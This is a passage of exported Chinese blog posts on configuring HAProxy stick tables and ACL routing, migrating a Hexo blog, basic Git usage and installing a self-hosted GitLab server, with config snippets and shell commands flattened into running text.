是haproxy的一个非常优秀的特性，这个表里面存储的是stickiness记录，stickiness记录了客户端和服务端1:1对应的引用关系。通过这个关系，haproxy可以将客户端的请求引导到之前为它服务过的后端服务器上，也就是实现了会话保持的功能。这种记录方式，俗称会话粘性(stickiness)，即将客户端和服务端粘连起来。 stick table中使用key/value的方式映射客户端和后端服务器，key是客户端的标识符，可以使用客户端的源ip(50字节)、cookie以及从报文中过滤出来的部分String。value部分是服务端的标识符。 由于每条stickiness记录占用空间都很小(平均最小50字节，最大166字节，由是否记录额外统计数据以及记录多少来决定占用空间大小)，使得即使在非常繁忙的环境下多个节点之间推送都不会出现压力瓶颈和网络阻塞(可以按节点数量、stickiness记录的大小和平均并发量来计算每秒在网络间推送的数据流量)。 它不像被人诟病的session复制(copy)，因为session复制的数据量比较大，而且是在各应用程序服务器之间进行的。而一个稍大一点的核心应用，提供服务的应用程序服务器数量都不会小，这样复制起来很容出现网络阻塞。 此外，stick table 还可以在haproxy重启时，在同一个机器内新旧两个进程间进行复制，这是本地复制。当haproxy重启时，旧haproxy进程会和新haproxy进程建立TCP连接，将其维护的stick table 推送给新进程。这样新进程不会丢失粘性信息，和其他节点也能最大程度地保持同步，使得其他节点只需要推送该节点重启过程中新增加的stickiness记录就能完全保持同步。 vim /etc/haproxy/haproxy.cfg (替换listen块) 123456789101112listen 192.168.2.65 *:80 stick-table type ip size 1m expire 1m stick on src #以源ip为key进行粘贴，size 1m表示能记录100W条，1分钟没请求粘贴过期 stats uri /haproxy-stats stats realm Haproxy\\ statistics stats auth li:li123 stats hide-version balance roundrobin option forwardfor option httpchk HEAD /check.txt HTTP/1.0 server server1.com 192.168.224.11:80 check inter 2000 rise 2 fall 5 server server2.com 192.168.224.12:80 check inter 2000 rise 2 fall 5 systemctl reload haproxy 重新加载后客户端测试注意：这里最好用listen格式写，用frontend,backend格式写的话，以源ip为key的参数不生效。 验证：无论使用Curl还是浏览器都可以保持亲缘性会话。 第二次做实验用frontend,backend格式写，以源ip为key的参数可以生效。测试时间(2020-7-13) 12345678910111213141516171819202122232425frontend 192.168.224.10 *:80 fefault_backend serversbackend servers stick-table type ip size 1m expire 1m stick on src stats uri /haproxy-stats stats realm Haproxy\\ statistics stats auth li:li123 stats hide-version balance roundrobin option forwardfor option httpchk HEAD /check.txt HTTP/1.0 server server1.com 192.168.224.11:80 check inter 2000 rise 2 fall 5 server server2.com 192.168.224.12:80 check inter 2000 rise 2 fall 5listen statspage # 定义监控管理接口的界面 bind *:8888 # 定义访问页面端口 stats enable # 启用管理界面 stats hide-version # 隐藏版本 stats uri /admin?stats # 访问路径 stats auth li:li123 # 访问时需要验证登录 stats admin if TRUE # 如果登录成功就可以管理在线服务器 ============================================================== 使用haproxy做动静分离或网站数据切分（七层调度)通过HAProxy的ACL规则实现智能负载均衡 **由于HAProxy可以工作在七层模型下， 因此，要实现HAProxy的强大功能，一定要使用强大灵活的ACL规则，通过ACL规则可以实现基于HAProxy的智能负载均衡系统。HAProxy通过ACL规则完成两种主要的功能，分别是：** 1）通过设置的ACL规则检查客户端请求是否合法。如果符合ACL规则要求，那么就将放行，反正，如果不符合规则，则直接中断请求。 2）符合ACL规则要求的请求将被提交到后端的backend服务器集群，进而实现基于ACL规则的负载均衡。 HAProxy中的ACL规则经常使用在frontend段中，使用方法如下： acl 自定义的acl名称 acl方法 -i [匹配的路径或文件] 其中： acl：是一个关键字，表示定义ACL规则的开始。后面需要跟上自定义的ACL名称 。 acl方法:这个字段用来定义实现ACL的方法，HAProxy定义了很多ACL方法，经常使用的方法有hdr_reg(host)、hdr_dom(host)、hdr_beg(host)、url_sub、url_dir、path_beg、path_end等。 -i：表示忽略大小写，后面需要跟上匹配的路径或文件或正则表达式。 与ACL规则一起使用的HAProxy参数还有use_backend，use_backend后面需要跟上一个backend实例名，表示在满足ACL规则后去请求哪个backend实例，与use_backend对应的还有default_backend参数，它表示在没有满足ACL条件的时候默认使用哪个后端backend。 下面列举几个常见的ACL规则例子： 12345678910111213acl www_policy hdr_reg(host) -i ^(www.z.cn|z.cn)acl bbs_policy hdr_dom(host) -i bbs.z.cnacl url_policy url_sub -i buy_sid=use_backend server_wwwifwww_policyuse_backend server_appifurl_policyuse_backend server_bbsifbbs_policydefault_backend server_cache 一个动静分离的例子 1234567acl url_static path_beg -i /data/static/images/javascript/stylesheets #url开头为这些的静态内容acl url_static path_end -i .jpg .gif .png .css .js .html .ico #url结尾带为这些的静态内容use_backend staser if url_static #如果静态内容符合url_static的条件，就调度到staser中的服务器default_backend dyser #其他默认调度到dyser中的服务器 实例 12345678910111213141516171819vim /etc/haproxy/haproxy.cfg (替换listen块)frontend 192.168.2.65 *:80 # acl invalid_src src 192.168.2.x #如果你要拒绝它访问，就把注释打开 block if invalid_src acl url_static path_end .html .png .jpg .css .js #url_static相当于变量名 #path_end表示以什么结束的文件，表示以.html .png .jpg .css .js 结尾的uri 都是url_static use_backend static if url_static #static 为自定义名， # usr_backend表示使用backend服务，if表示如果满足url_static这个条件就调度到static这台服务器上也就是server1.com default_backend dynamic #dynamic 为自定义名 其他类型转发给dynamic backend static # 定义调用后端的静态页面的服务器上 balance roundrobin server server1.com 192.168.224.11:80 check inter 2000 rise 2 fall 5 backend dynamic balance roundrobin server server2.com 192.168.224.12:80 check inter 2000 rise 2 fall 5 systemctl restart haproxy 测试结果： .html .png .jpg .css .js 被认为是静态文件，都会转发到 224.11, 其他类型的文件请求都会被转发到224.12测试方法： 在web服务器上建立.txt类型的文件测试是否请求会被转发到224.12. 也可以请求不存在的文件，haproxy仍然会将请求转发到后台web。通过查看后台web日志可以判定请求被转发到了那个web. web日志查看命令： tail -f /var/log/httpd/access_log 12345678910echo web1-html &gt; /var/www/html/1.htmlecho web1-txt &gt; /var/www/html/1.txtecho web2-html &gt; /var/www/html/1.htmlecho web2-txt &gt; /var/www/html/1.txtcurl 192.168.224.10/1.htmlweb1-htmlcurl 192.168.224.10/1.txtweb2-txt 实现网站切分 vim /etc/haproxy/haproxy.cfg (替换listen块) 123456789101112131415161718frontend 192.168.2.65 *:80 acl url_static path_beg /static /images /img acl url_static path_end .html .png .jpg .css .js #url_static相当于变量名 acl host_static hdr_beg(host) -i img. video. download. #host_static相当于变量名 acl host_www hdr_beg(host) -i www #定义ACL名称为host_www,对应的请求的主机头是www use_backend static if url_static #满足条件就调度到static中的服务器中 use_backend static if host_static #主机头包含host_static定义的内容就调度到static中 use_backend dynamic if host_www backend static #定义static服务器。 balance roundrobin server server1.com 192.168.224.11:80 check inter 2000 rise 2 fall 5backend dynamic balance roundrobin server server2.com 192.168.224.12:80 check inter 2000 rise 2 fall 5 在客户端编辑hosts vim /etc/hosts 12192.168.2.65 www.abc.com192.168.2.65 img.abc.com 测试结果： 1234curl http://www.abc.com -&gt; Web2curl http://www.abc.com/static/abc.abc -&gt; Web1curl http://192.168.2.65/1.html -&gt; Web1curl http://img.abc.com/static/abc.abc -&gt; Web1 重点：http://www.abc.com 因为是www开头，所以定义为动态内容http://www.abc.com/static/abc.abc 尽管/www开头，但是由web1处理， 如果URL同时命中了多条ACL规则，那URL结尾所访问的文件类型优先级别最高 Lvs, Haproxy, Nginx这几种软件的特点。 squid,,nginx cache可以做缓存加速 开源负载均衡nginxharpoxylvs lvs 四层nginx,haproxy 七层 抗并发 lvs &gt; haproxy &gt; nginx应用范围 lvs最广网络复杂度 lvs复杂会话保持 haproxy会话保持的方式较多负载均衡算法 lvs最多 ========================================================================","link":"/2020/08/03/haproxy/"},{"title":"hexo博客的迁移","text":"Hexo 博客源代码的迁移1.搭建好git和node.js环境。 1234567891011121314151617181920212223242526272829https://nodejs.orgwget https://nodejs.org/dist/v12.14.0/node-v12.14.0-linux-x64.tar.xztar -xvf node-v12.14.0-linux-x64.tar.xz -C /usr/local/ #解压tarcd /usr/local/mv node-v12.14.0-linux-x64/ node配置环境变量vim /root/.bash_profilePATH=$PATH:$HOME/bin:/usr/local/node/bin#使环境变量生效source /root/.bash_profile#安装git yum install -y git #查看版本信息node -vv12.14.0npm -v6.13.4git versiongit version 1.8.3.1 安装Hexo 1npm install -g hexo-cli 2.在本地创键目录做相关配置创建好目录后就git init 初始化。然后把源代码clone下来 123456789mkdir zhi666local &amp;&amp; cd zhi666localgit init #https方式git clone https://github.com/zhi666/blog.git#ssh秘钥方式 (推荐这种方式)git clone git@github.com:zhi666/blog.git 配置局部的用户名和邮箱 12git config user.name &quot;zhi666&quot;git config usr.email &quot;1378373724@qq.com&quot; 然后在进入blog目录里的myBlog目录。 1234567cd blog/myBlog复制主题文件到themes目录下cp -a amazing themes/安装相关依赖npm install 开始在本地测试 12345hexo clean hexo g #生成public目录文件，渲染好html页面hexo s #本地部署，看下能不能正常访问。 3. 部署到远程github.io上面本地测试正常，则可以部署到github了 先创建SSH key 1ssh-keygen -t rsa -C &quot;1378373724@qq.com&quot; 按照提示完成三次回车，即可生成ssh key .通过查看 ~/.ssh/id_rsa.pub 文件就可以了 然后在github上面创建新的SSH key ,key就填写刚才生成的那个 公钥设置ok后就可以开始部署了 12345hexo d #直接部署hexo g -f -d #直接清除缓存强制部署hexo g -d #先重新生成渲染html页面。再部署到远程 4. 修改本地代码后把代码推送到github上blog仓库中这步操作只需要迁移前操作即可 123456789101112#如果 themes/amazing/下的目录文件修改，就要把文件复制一份到myBlog目录下\\cp -a themes/amazing ./amazing git add .git commit -m &quot;新增部分代码&quot;git remote -v #查看远程仓库信息git push -u origin master 现在远程的blog仓库的代码就是最新的了，就可以按照上面的步骤直接去迁移了","link":"/2020/08/07/hexo%E5%8D%9A%E5%AE%A2%E7%9A%84%E8%BF%81%E7%A7%BB/"},{"title":"git","text":"GIT简单说明从哪儿来？ GIT出生高贵，出自于LinusTorvalds之手，仅用了两个礼拜就给折腾出来了 linus又是谁？ 有什么用？ Git是一个开源的分布式版本控制系统，用于敏捷高效地处理任何或小或大的项目。 分布式版本控制系统又是啥？ 我们自己平时写个“HelloWorld”程序，或者写一个只有几百行代码的小项目，不需要专门的代码管理工具，依靠自己的记忆就能把代码捋顺。 但是，一旦涉及到代码量巨大的项目，往往需要经过很多人协同工作数周乃至数月才能完成。 开发过程中，会面临着代码的修改、增删、恢复等工作，开发人员不可能清楚的记得每次变化，这时候就需要借助版本管理工具来跟踪代码的变化历程。 版本管理工具赋予每个文件一个版本号，每次修改之后，哪怕只改动了一个字母，版本管理工具都会精确地记录下来，并改变该文件的版本号。 这样，每个版本号就对应着文件的一次变化，依此可以进行文件的对比、恢复等操作。 缓存区 永久存放区 vim a.txt ---&gt; add ---&gt; commit 修改其中某一行 修改其中某一行 ​ 分布式版本控制系统都有哪些？SVNVCSGIT…… ===================================================================== GIT的安装安装git及其依赖包 12345# yum install -y curl-devel expat-devel gettext-devel openssl-devel zlib-devel git-core查看安装的GIT版本# git --version git version 1.8.3.1 # 能看到版本信息说明已经安装完成了 ========================================================================= GIT的配置文件：/etc/gitconfig # 全局配置文件（主配置文件），对所有用户都有效的参数配置 git config –system 时使用该文件 ~/.gitconfig # 局部配置文件，仅对当前用户有效的参数配置 git config –global 时使用该文件 工作目录中的.git/config文件 # 该文件仅对当前工作目录有效，如果有该配置文件，则会覆盖以上两个文件的效果 git的配置查找过程：./.git/config –&gt; ~/.gitconfig –&gt; /etc/gitconfig git config –list # 列出当前git的所有配置详情（有时会出现重复选项，是来自于多个配置文件） GIT用户和email的设置： git config –global user.name “username” git config –global user.email “You are email!” ========================================================================= GIT版本库的创建：先创建一个目录，用于当作git仓库使用 mkdir /testgit 将刚刚创建的目录初始化为git仓库 cd /testgit git init # 将当期目录初始化为git仓库 或者： git init /testgit # 将指定目录初始化为git仓库 初始化完成后会在指定目录内自动生成一个.git目录，存放git必备的文件，该目录下文件请勿随意修改： ls -a /testgit. .. .git ============================================================================== GIT文件上传：备注： git add filename # 添加一个文件到git版本库临时文件中，此时并未对版本库中的内容真正修改 git commit -m ‘备注信息’ # 提交刚刚添加的文件至版本库中，此时才会对版本库中的内容进行修改（注意：-m 后面的备注信息为自定义内容，为了后期更好查阅，该备注信息最好写上，而且最好写的详细些） 例如： echo ‘test’ &gt;a.txt # 创建一个即将上传的文件，内容自定义 git add a.txt # 将刚刚创建的文件添加到git的临时文件中**(注意：切记，上传的文件必须在你创建的仓库目录中，否则将会报致命错误，可以多次add后再执行commit，每次可add多个文件，以空格为分隔符：# git add a.txt b.txt )** git commit -m “添加新文件a.txt” # 提交之前的所有操作,中文需中文字符的支持（新增文件、修改文件、删除文件） # 位于分支 master​ # # 初始提交​ #​ …… （此时将无法正常提交，因为我们还没有进行用户和email的设置） git config user.name ‘test’ # 为当前用户设置一个git帐号 git config user.email ‘test@localhost’ # 为当前用户设置一个git帐号邮箱 git config –list # 查看当前用户配置信息 user.name=test # 帐号信息 user.email=test@localhost # 邮箱信息 core.repositoryformatversion=0 core.filemode=true core.bare=false core.logallrefupdates=true git commit -m ‘新增文件a.txt’ # 再次提交就可以成功了 [master（根提交） 61be9a1] test1 1 file changed, 1 insertion(+) create mode 100644 1.txt ======================================================================= GIT 之 “后悔药”123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159 vim a.txt test test2 # 在a.txt文件中新增一行 git status # 此时再来查看，系统便会提示有新的修改，但还没有提交 # 位于分支 master # 尚未暂存以备提交的变更： # （使用 &quot;git add &lt;file&gt;...&quot; 更新要提交的内容） # （使用 &quot;git checkout -- &lt;file&gt;...&quot; 丢弃工作区的改动）​ # # 修改： 1.txt​ #​ 修改尚未加入提交（使用 &quot;git add&quot; 和/或 &quot;git commit -a&quot;） git diff a.txt # 用diff的形式展示文件内容，以对比修改前和修改后的不同处 diff --git a/1.txt b/1.txt index 9daeafb..259b241 100644 --- a/1.txt +++ b/1.txt @@ -1 +1,2 @@ test +test1 # 会告诉你，这里新增了一行内容如果该内容确实为你所需要修改的，就可以使用add来进行添加了，不过add只是添加进缓存，不会对版本库的内容修改，需要commit后才会 git add a.txt # 将a.txt新增的内容添加进git的缓存中 git status # 再次查看 # 位于分支 master # 要提交的变更： # （使用 &quot;git reset HEAD &lt;file&gt;...&quot; 撤出暂存区） # # 修改： 1.txt #现在系统会提示你，之前的修改已经加入到缓存中了，但还未正式提交至版本库中，如果确认之前的修改没有问题，就可以进行commit操作了，将前面的修改提交至版本库中 git commit -m '修改a.txt，新增一行' # 提交之前对a.txt的操作 [master a5178c8] 修改a.txt，新增一行 1 file changed, 1 insertion(+) git status # 再次查看，又会提示工作区无内容，因为我们将所有操作都已经提交了，所以工作区现在为空 # 位于分支 master 无文件要提交，干净的工作区 ***git log # 通过该命令，可以看到全部的git操作，包含版本号、提交用户信息、提交时间、备注*** commit a5178c8db1d0d65fb2345dafd87a012451ffaad8 Author: test &lt;test@localhost&gt; Date: Fri Oct 5 17:00:59 2018 +0800 修改a.txt，新增一行 # 最近一次操作 commit 0a600a215dff87d5c4a554081082530ed24b1da0 Author: test &lt;test@localhost&gt; Date: Fri Oct 5 16:51:17 2018 +0800 添加新文件a.txt # 第一次操作（在commit时，后面的备注信息都会记录到日志文件中，所以git默认是必须添加备注信息的）如果嫌上面的内容太过于冗长，可以使用： ***git log --pretty=oneline # 只显示版本号和备注信息***​ a5178c8db1d0d65fb2345dafd87a012451ffaad8 修改a.txt，新增一行​ 0a600a215dff87d5c4a554081082530ed24b1da0 添加新文件a.txt（备注：前面的一长串字符串为git的版本号；后面的为提交时所填写的备注信息）**************************************************************************************命令解析： git log # 查看git日志，可以看到都提交了哪些内容 git reset --hard HEAD^ # 回退到上一个版本（git会自动回到上一次提交前的版本） git reset --hard [commit id] # 回退到指定的版本（commit id可以通过：git log来确定） git reflog # 查看git所有做过的事情（如果之前的一次回退是错误的，需通过该命令来找回commit id）**************************************************************************************例如： cat a.txt # 当前a.txt有三行内容 test test test git log commit 3a7c1eb28243b8ef7ffda0455b1c665bec15a2e4 Author: test &lt;test@localhost&gt; Date: Fri Oct 5 17:23:05 2018 +0800 第二次修改a.txt commit a5178c8db1d0d65fb2345dafd87a012451ffaad8 Author: test &lt;test@localhost&gt; Date: Fri Oct 5 17:00:59 2018 +0800 修改a.txt，新增一行 commit 0a600a215dff87d5c4a554081082530ed24b1da0 Author: test &lt;test@localhost&gt; Date: Fri Oct 5 16:51:17 2018 +0800 添加新文件a.txt***如果想回到“修改a.txt，新增第一行”的版本位置；*** git reset --hard HEAD^ # git将自动向下回退一个版本 HEAD 现在位于 a5178c8 修改a.txt，新增一行 cat a.txt # 回退后a.txt回到了第二次修改前的样子 test test git log # 回退后，日志信息也将发生变化 commit a5178c8db1d0d65fb2345dafd87a012451ffaad8 Author: test &lt;test@localhost&gt; Date: Fri Oct 5 17:00:59 2018 +0800 修改a.txt，新增一行 commit 0a600a215dff87d5c4a554081082530ed24b1da0 Author: test &lt;test@localhost&gt; Date: Fri Oct 5 16:51:17 2018 +0800 添加新文件a.txt如此时还想回退到“第二次修改a.txt”版本处，如果当前会话没有关闭，可以找到之前第二次修改的commit id来进行恢复： git reset --hard a5178c8 # commit id 不用写全，只写前面几位即可，git会自动补全，但不能太少位数 HEAD 现在位于 a5178c8 修改a.txt，新增一行 cat a.txt # 再次查看a.txt会发现又回到了第二次修改后的模样 test test test**如果当前终端已经关闭，无法通过历史找回commit id，可以通过：** git reflog # 查找历史操作记录来找回commit id e87bbb6 HEAD@{0}: reset: moving to HEAD^ d582500 HEAD@{1}: commit: 第二次修改a.txt e87bbb6 HEAD@{2}: commit: 第一次修改a.txt ......（每次的操作都会记录下来，第一个字段即为该次操作的版本号） git reset --hard e87bbb6 # 直接通过找到的版本号进行恢复 HEAD 现在位于 e87bbb6 第一次修改a.txt cat a.txt test test test ================================================================================ 工作区、缓存区的作用工作区(仓库目录) add –&gt; 缓存区（临时存放） commit –&gt; master(永久存放) 由上可知：当我们对一个文件进行”git add filename”后，文件被修改的内容将存放至缓存区，不会直接修改master的内容，只有当”git commit”后，git才会将修改的内容写入到永久存放区；值得注意的是，git的特性为 管理文件的修改，而不是直接管理文件，所以，如果你进行了多次修改，都需要进行add才能将修改写入到缓存区；例如： vim a.txt test test test1 git add a.txt vim a.txt test test test1 test2 git commit -m ‘第三次修改a.txt’ [master 2d5e028] 第三次修改a.txt 1 file changed, 1 insertion(+) 12345678910 git status # 位于分支 master # 尚未暂存以备提交的变更： # （使用 &quot;git add &lt;file&gt;...&quot; 更新要提交的内容） # （使用 &quot;git checkout -- &lt;file&gt;...&quot; 丢弃工作区的改动）​ # # 修改： a.txt​ #​ 修改尚未加入提交（使用 &quot;git add&quot; 和/或 &quot;git commit -a&quot;） 提交后查看一下git的状态，你会发现，git还是提示a.txt有一次新的修改未被提交，因为最后一次修改后你并未重新提交，所以git没有将其写入缓存区 12345678910git diff HEAD -- a.txt # 使用命令将工作区和当前版本库的内容进行对比一下，确实后面添加的一行没有提交diff --git a/a.txt b/a.txtindex 0867e73..d0c7fbe 100644--- a/a.txt+++ b/a.txt@@ -1,3 +1,4 @@ test test test1+test2 总结：如果你需要对工作区多个文件修改，那么请先将需要修改的都改好后，再进行add，然后commit，这样就可以省去多次add和提交了 ================================================================= GIT之 撤销修改 vim a.txt test test test1 test2 tset 保存后发现刚刚新增的一行或者是修改的内容有错误，需撤销后重新编辑，这时可使用： git checkout – filename #（当然，也可以直接手动修改文件内容）该命令会有两种恢复情况：1.如果修改后还未提交至缓存区，则将文件内容恢复到与版本库相同的状态2.如果修改前有过提交至缓存区，则恢复文件内容到和缓存区相同的状态 例如，未add之前的撤销: git checkout – a.txt # 注意：必须要有 – 如果没有，则是另一个含义了 cat a.txt test test test1 test2 # 之前新增的那行不见了 已经add之后的撤销： git reset HEAD a.txt # 将缓存区中保存的临时文件撤回到a.txt文件中 重置后撤出暂存区的变更： M a.txt git checkout – a.txt # 在使用命令撤销文件修改过的内容即可 cat a.txt test test test1 test2 ​问：如果不小心将错误的内容已经写入到了版本库，该如何恢复？ git reset –hard HEAD^​ or git reset –hard [commit id] (注意：切记；上面的恢复仅限未推送到远程版本库，如果推送至远程版本库后，撤销起来将会非常麻烦) GIT之 删除文件与版本库文件一般情况下，有不需要的文件都是直接rm掉，git中也会监控文件的删除，如果有删除，git会告诉你都删除了哪些文件例如： touch b.txt git add b.txt git commit -m ‘新建文件b.txt’ rm -f b.txt # 直接将文件b.txt删掉 123456789git status# 位于分支 master# 尚未暂存以备提交的变更：# （使用 &quot;git add/rm &lt;file&gt;...&quot; 更新要提交的内容）# （使用 &quot;git checkout -- &lt;file&gt;...&quot; 丢弃工作区的改动）## 删除： b.txt # git会很明确的告诉你删除了哪个文件#修改尚未加入提交（使用 &quot;git add&quot; 和/或 &quot;git commit -a&quot;） 该情况下，有两个选择，如果确实需要删掉该文件，可以使用以下命令将该文件从版本库也一起删掉： 123456git rm b.txt # 从版本库也删除b.txt rm 'b.txt git commit -m '删除文件b.txt' # 将删除b.txt文件同步到版本库中[master 95015c7] 删除文件b.txt 1 file changed, 0 insertions(+), 0 deletions(-) delete mode 100644 b.txt ​ 注意：如果你删掉文件后使用版本库进行恢复，恢复的内容为最近一次提交至版本库的版本，所以会丢失该版本库以后的内容 =============================================================== GIT之 远程版本库远程版本库分两种：1、别人提供的2、自己搭建的 目前最主流的web远程版本库github与码云github注册及远程版本库创建过程详见Word文档”git工作原理图&amp;github注册流程”；请下载后查看 E github远程版本库的使用方法：主要使用两种方式：1、https协议传输；该方式每次推送都需要验证帐号和密码，比较麻烦2、ssh协议传输；该方式直接通过ssh协议的密钥对进行验证，只需在github上配置好公钥即可； 1、使用https推送的使用 添加远程版本库，origin为你设置的远程库名称，可自定义，zstest换成你自己注册的用户名，test.git换成你自己的版本库名称 git remote add origin https://github.com/zstest/test.git 将本地版本库中的内容全部推送至远程版本库；origin为刚刚添加时定义的版本库名称 git push -u origin master Username for ‘https://github.com': zstest # 输入注册的用户名 Password for ‘https://ninmu@github.com': # 输入注册的用户密码 Counting objects: 3, done. Compressing objects: 100% (2/2), done. Writing objects: 100% (2/2), 262 bytes | 0 bytes/s, done. Total 2 (delta 0), reused 0 (delta 0) To https://github.com/ninmu/one.git 2502bb2..da8228c master -&gt; master 分支 master 设置为跟踪来自 origin_test 的远程分支 master。 该方法比较繁琐，每次推送都需要验证用户名和密码 2、使用ssh协议推送；配置过程请见Word文档”git工作原理图&amp;github注册流程”按照word文档上配置完成后，即可开始添加远程版本库： 12345678910111213141516171819202122ssh-keygen –t rsa –C “你自己的邮箱地址” # 产生ssh密钥对，输入命令后全部回车即可Generating public/private rsa key pair.Enter file in which to save the key (/root/.ssh/id_rsa): Created directory '/root/.ssh'.Enter passphrase (empty for no passphrase): Enter same passphrase again: Your identification has been saved in /root/.ssh/id_rsa.Your public key has been saved in /root/.ssh/id_rsa.pub.The key fingerprint is:0e:99:bf:a5:57:6c:a2:b1:96:5d:b7:d0:39:53:b5:2f 11842855@qq.comThe key's randomart image is:+--[ RSA 2048]----+| || .|| o|| o ..|| + S . . o.|| +. . * E .|| o*.= o = || =+o . || .o. |+-----------------+ 123456789# cat ~/.ssh/id_rsa.pub # 将该文件的内容复制粘贴进github即可 ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDanYyhhV6+3vBUJp7VMDNevMColpKlz9TdJ/JIH1A8DieUly8WPyrXKhfaL74Umx7E0Qp6iKKxwb5v14kiebCq0hvqeBk5rm5sKRKj47A2AI1l3IfXpjmTbuvFtRiiPFsKDhHaHXrrCvmc3ebsGP5NEsTvuwHYVeGyPrWV6se0b7TmL/7SOm3GYiMSYNGA8B8179lDAwvN3fUPw3hHmj/Any2i5MeWf1xhhtfUdH1RRjgsbxJFM8Vp+M9II6yaNy4hZP5rX94Giu4c4DCWzL7D3w/I94QxmzOoaOOxFTSRiJr1VLRk6pOsbeOjy8wrLsbZSkhVWWIdHfMkdqHqYUxx 11842855@qq.com注意：添加时定义的远程版本库的名称不能重复# git remote add origin_1 git@github.com:test/test.git添加完成后即可开始进行推送任务# git push -u origin_1 master ...... 备注：第一次推送任务会将本地版本库中所有内容都推送过去，以后每次有修改都可以使用该命令进行推送 =============================================================== GIT 私有版本库之 GITLAB想要免费，且更加安全的私有版本库，只能自己搭建 GITLAB是一款开源的分布式存储管理系统，可以让你自己也能轻松实现自己的git远程版本库，且可以免费拥有私有版本库 Gitlab提供的功能：1、用户管理2、组管理3、私有版本库4、公开版本库等等 Gitlab的安装过程：安装前准备：1、绑定主机名2、绑定hosts3、关闭iptables和selinux4、停止所有占用80和8080端口的服务 1、下载软件包镜像源，下载偏慢 wget https://mirrors.tuna.tsinghua.edu.cn/gitlab-ce/yum/el7/gitlab-ce-10.0.6-ce.0.el7.x86_64.rpm 最新版本 wget https://mirrors.tuna.tsinghua.edu.cn/gitlab-ce/yum/el7/gitlab-ce-12.5.2-ce.0.el7.x86_64.rpm 2、安装依赖 yum install -y curl policycoreutils-python openssh-server openssh-clients 3、开始安装Gitlab(使用本地rpm包安装) yum localinstall -y gitlab-ce-10.0.6-ce.0.el7.x86_64.rpm 由于包比较大，所以安装过程会慢些 4、修改Gitlab配置把13行后面的IP换成你自己的IP地址，否则后面添加用户时会出现无法设置密码的情况，IP前面必须有’http://‘否则会报错 vim /etc/gitlab/gitlab.rb 23行 external_url ‘http://192.168.224.11' ​ 以下为配置邮件服务的内容 不配置也可以的 123456789101112131415161718192021222324 在文件末尾添加以下内容：​ gitlab_rails['smtp_enable'] = true​ gitlab_rails['smtp_address'] = &quot;smtp.qq.com&quot;​ gitlab_rails['smtp_port'] = 465​ gitlab_rails['smtp_user_name'] = &quot;******@qq.com&quot; --你的qq邮箱地址​ gitlab_rails['smtp_password'] = &quot;授权码&quot; --qq邮箱内获得 ​ gitlab_rails['smtp_domain'] = &quot;smtp.qq.com&quot;​ gitlab_rails['smtp_authentication'] = &quot;login&quot;​ gitlab_rails['smtp_enable_starttls_auto'] = true​ gitlab_rails['smtp_tls'] = true​ gitlab_rails['gitlab_email_from'] = &quot;******@qq.com&quot; --你的qq邮箱地址gitlab_rails['smtp_enable'] = truegitlab_rails['smtp_address'] = &quot;smtp.qq.com&quot;gitlab_rails['smtp_port'] = 465gitlab_rails['smtp_user_name'] = &quot;*******@qq.com&quot;gitlab_rails['smtp_password'] = &quot;授权码&quot;gitlab_rails['smtp_domain'] = &quot;smtp.qq.com&quot;gitlab_rails['smtp_authentication'] = &quot;login&quot;gitlab_rails['smtp_enable_starttls_auto'] = truegitlab_rails['smtp_tls'] = truegitlab_rails['gitlab_email_from'] = &quot;*******@qq.com&quot; 5、初始化Gitlab gitlab-ctl reconfigure 过程比较慢 3分钟左右echo $? 6、启动Gitlab服务 gitlab服务管理命令：启动Gitlab服务 # gitlab-ctl start查看Gitlab的状态 # gitlab-ctl status停止Gitlab服务 # gitlab-ctl stop 7、查看端口监听情况 lsof -i:80 # Gitlab默认监听的端口为80和8080两个端口 COMMAND PID USER FD TYPE DEVICE SIZE/OFF NODE NAME nginx 5453 root 7u IPv4 38573 0t0 TCP *:http (LISTEN) nginx 5454 gitlab-www 7u IPv4 38573 0t0 TCP *:http (LISTEN) lsof -i:8080 8、启动后就可以到web浏览器输入你的IP地址进行下一步了；详情请参见“github与gitlab使用说明”word文档 默认登陆用户是root9、安装完成后，打开浏览器，输入你的IP地址即可访问gitlab页面了 有时候访问80访问不了，那就可能是端口占用了，需要直接修改端口，直接修改web_server配置文件，默认在/var/opt/gitlab/nginx/conf/gitlab-http.conf Gitlab远程版本库的使用备注：Gitlab的使用过程和github和相似，都可以通过多种协议来进行推送和克隆 1234567891011121、http协议方式# git remote add origin https://IP/zstest/test.git# git remote add luke1 http://192.168.224.11:8989/root/luke.git2、ssh协议方式# ssh-keygen –t rsa –C “你自己的邮箱地址” # 产生ssh密钥对，输入命令后全部回车即可# cat ~/.ssh/id_rsa.pub # 将该文件的内容复制粘贴进hub即可# git remote add origin_2 git@IP:test/test.git # 添加远程版本库# git push origin_2 master # 将本地版本库内容推送至你自己搭的远程版本库中# git push luke1 master 一台服务器如何使用多个远程版本库： (备注：添加第二个sshkey之后必须将第二个版本库删除后重建才能正常推送) 注意：一个ssh_key只能提供一个版本库使用，如果一台服务器需要使用多个版本库，直接生成多个ssh_key即可： 12345678# ssh-keygen -t rsa -C '邮箱地址'Generating public/private rsa key pair.Enter file in which to save the key (/root/.ssh/id_rsa): /root/.ssh/gitlab_rsa --设置不同文件名......# eval `ssh-agent -s`# ssh-add ~/.ssh/gitlab_rsa --启用刚刚生成的新ssh_key 上面的准备好后，直接将新的公钥内容复制进去即可 远程版本库的删除： git remote –列出当前已添加的所有远程版本库信息 git remote -v –长格式列出当前的所有远程版本库信息 git remote remove test –删除远程版本库test 远程版本库的下载： git clone git@IP:username/test.git # 将指定服务器中的test远程版本库克隆到本地当前目录 例如： git clone git@3.3.3.8:root/test.git # 将3.3.3.8上的test这个远程版本库克隆到本地，用户名 root ======================================================== 本章总结1234567891011121314151617181920212223242526272829303132333435363738本地版本库操作命令：# git init --初始化本地版本库# git add filename --添加文件进版本库# git commit -m '备注信息' --提交文件进版本库永久存放区# git status --查看git版本库当前状态# git diff filename --将本地版本库中的文件与版本库永久存放区中的文件进行对比# git log --查看git操作日志# git reflog --查看git历史操作（恢复版本时会用到）# git reset --hard HEAD^ --将本地版本库回退到上一个版本# git reset --hard [版本号] --将本地版本库回退到指定版本# git checkout -- filename --撤销上一次操作 该命令会有两种恢复情况： 1.如果修改后还未提交至缓存区，则将文件内容恢复到与版本库相同的状态 2.如果修改前有过提交至缓存区，则恢复文件内容到和缓存区相同的状态# git rm filename 